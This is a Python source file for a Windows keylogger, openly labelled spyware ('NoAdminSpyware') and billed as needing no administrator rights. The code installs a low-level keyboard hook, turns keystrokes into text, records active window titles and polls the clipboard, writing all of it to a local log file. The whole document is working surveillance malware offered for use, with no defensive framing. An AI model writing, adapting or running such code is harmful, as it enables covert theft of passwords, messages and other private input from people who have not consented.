
#!/usr/bin/env python3

""" Implementation of simple keylogger in Python for Windows - No admin required.
"""

import sys
import time
import logging
import threading
from ctypes import windll, CFUNCTYPE, c_int, c_void_p, byref, Structure, WINFUNCTYPE, POINTER
from ctypes.wintypes import DWORD, WORD, LONG, WPARAM, LPARAM, MSG

# Windows API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101

# Windows API structures
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", DWORD),
        ("scanCode", DWORD),
        ("flags", DWORD),
        ("time", DWORD),
        ("dwExtraInfo", c_void_p)
    ]

# Windows API function prototypes
HOOKPROC = WINFUNCTYPE(c_int, c_int, WPARAM, LPARAM)

# Load Windows DLLs
user32 = windll.user32
kernel32 = windll.kernel32


class NoAdminKeylogger:
    """ Windows keylogger that doesn't require admin privileges. """

    def __init__(self, name):
        self._name = name
        self._running = False
        self._hook_id = None
        self._hook_proc = None
        self._last_key_time = 0
        self._key_buffer = []

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Try to start logging with low-privilege methods. """
        self._running = True
        
        # First try: Low-level keyboard hook (might work without admin on some systems)
        if self._try_low_level_hook():
            print("Low-level hook installed successfully")
            return True
        
        # Fallback: Focus-based logging (no admin required)
        print("Using focus-based logging (no admin required)")
        self._start_focus_logging()
        return True

    def _try_low_level_hook(self):
        """ Try to install low-level keyboard hook. """
        try:
            self._hook_proc = HOOKPROC(self._keyboard_proc)
            self._hook_id = user32.SetWindowsHookExA(
                WH_KEYBOARD_LL,
                self._hook_proc,
                kernel32.GetModuleHandleW(None),
                0
            )
            
            if self._hook_id:
                # Start message pump in separate thread
                thread = threading.Thread(target=self._message_loop)
                thread.daemon = True
                thread.start()
                return True
        except Exception as e:
            print(f"Low-level hook failed: {e}")
        
        return False

    def _message_loop(self):
        """ Windows message loop for the hook. """
        try:
            msg = MSG()
            while self._running and user32.GetMessageA(byref(msg), 0, 0, 0):
                user32.TranslateMessage(byref(msg))
                user32.DispatchMessageA(byref(msg))
        except Exception as e:
            logging.error(f"Message loop error: {e}")

    def _keyboard_proc(self, nCode, wParam, lParam):
        """ Low-level keyboard procedure. """
        if nCode >= 0 and wParam == WM_KEYDOWN:
            kbd_struct = KBDLLHOOKSTRUCT.from_address(lParam)
            char = self._vk_to_char(kbd_struct.vkCode)
            if char:
                logging.debug(char)
        
        return user32.CallNextHookEx(self._hook_id, nCode, wParam, lParam)

    def _start_focus_logging(self):
        """ Start focus-based logging that doesn't require admin. """
        thread = threading.Thread(target=self._focus_monitor)
        thread.daemon = True
        thread.start()

    def _focus_monitor(self):
        """ Monitor active window and log based on window focus. """
        last_window = None
        
        while self._running:
            try:
                # Get foreground window
                foreground = user32.GetForegroundWindow()
                
                if foreground != last_window:
                    last_window = foreground
                    # Get window title
                    title_length = user32.GetWindowTextLengthW(foreground)
                    title = " " * (title_length + 1)
                    user32.GetWindowTextW(foreground, title, title_length + 1)
                    
                    if title.strip():
                        logging.debug(f"\n[Window: {title.strip()}]\n")
                
                # Log simple activity indicator
                current_time = time.time()
                if current_time - self._last_key_time > 30:  # Every 30 seconds of inactivity
                    logging.debug("[Activity check - still running]")
                    self._last_key_time = current_time
                
                time.sleep(1)  # Check every second
                
            except Exception as e:
                logging.error(f"Focus monitor error: {e}")
                time.sleep(5)

    def _vk_to_char(self, vk_code):
        """ Convert virtual key code to character. """
        # Virtual key codes for common keys
        vk_map = {
            8: '[BACKSPACE]',
            9: '[TAB]',
            13: '\n[ENTER]\n',
            27: '[ESC]',
            32: ' ',
            46: '[DEL]'
        }
        
        if vk_code in vk_map:
            return vk_map[vk_code]
        
        # Letters A-Z
        if 65 <= vk_code <= 90:
            # Check shift state
            shift_pressed = user32.GetKeyState(0x10) & 0x8000
            caps_lock = user32.GetKeyState(0x14) & 0x0001
            
            if caps_lock ^ shift_pressed:
                return chr(vk_code)
            else:
                return chr(vk_code + 32)
        
        # Numbers 0-9
        elif 48 <= vk_code <= 57:
            shift_pressed = user32.GetKeyState(0x10) & 0x8000
            if shift_pressed:
                symbols = ")!@#$%^&*("
                return symbols[vk_code - 48]
            return chr(vk_code)
        
        return None

    def stop_logging(self):
        """ Stop the keylogger. """
        self._running = False
        if self._hook_id:
            user32.UnhookWindowsHookEx(self._hook_id)
            self._hook_id = None


class ClipboardLogger:
    """ Log clipboard content changes. """
    
    def __init__(self):
        self._running = False
        self._last_clipboard = ""

    def start_logging(self):
        """ Start monitoring clipboard. """
        self._running = True
        thread = threading.Thread(target=self._clipboard_monitor)
        thread.daemon = True
        thread.start()

    def stop_logging(self):
        self._running = False

    def _clipboard_monitor(self):
        """ Monitor clipboard for changes. """
        while self._running:
            try:
                if user32.OpenClipboard(None):
                    try:
                        # Try to get text data
                        if user32.IsClipboardFormatAvailable(1):  # CF_TEXT
                            data = user32.GetClipboardData(1)
                            if data:
                                # This is simplified - in real implementation you'd need to read the memory
                                current_content = "[Clipboard data detected]"
                                if current_content != self._last_clipboard:
                                    logging.debug(f"[CLIPBOARD]: {current_content}")
                                    self._last_clipboard = current_content
                    finally:
                        user32.CloseClipboard()
            except Exception as e:
                pass  # Clipboard might be in use by another process
            
            time.sleep(2)  # Check every 2 seconds


if __name__ == '__main__':
    # Setup logger
    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='%(asctime)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    print("Windows Keylogger - No Admin Required")
    print("=====================================")
    print("This version uses methods that don't require administrator privileges.")
    print("Logging to: activity.log")
    print("Press Ctrl+C to stop\n")
    
    # Create and start keylogger
    keylogger = NoAdminKeylogger('NoAdminSpyware')
    
    # Also start clipboard monitoring
    clipboard_logger = ClipboardLogger()
    clipboard_logger.start_logging()
    
    try:
        if keylogger.start_logging():
            print("Keylogger started successfully!")
            print("Monitoring keyboard activity and window changes...")
            
            # Keep the main thread alive
            while True:
                time.sleep(1)
                
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
    except Exception as e:
        print(f"Error: {e}")
        logging.error(f"Main error: {e}")
    finally:
        keylogger.stop_logging()
        clipboard_logger.stop_logging()
        print("Keylogger stopped. Check activity.log for results.")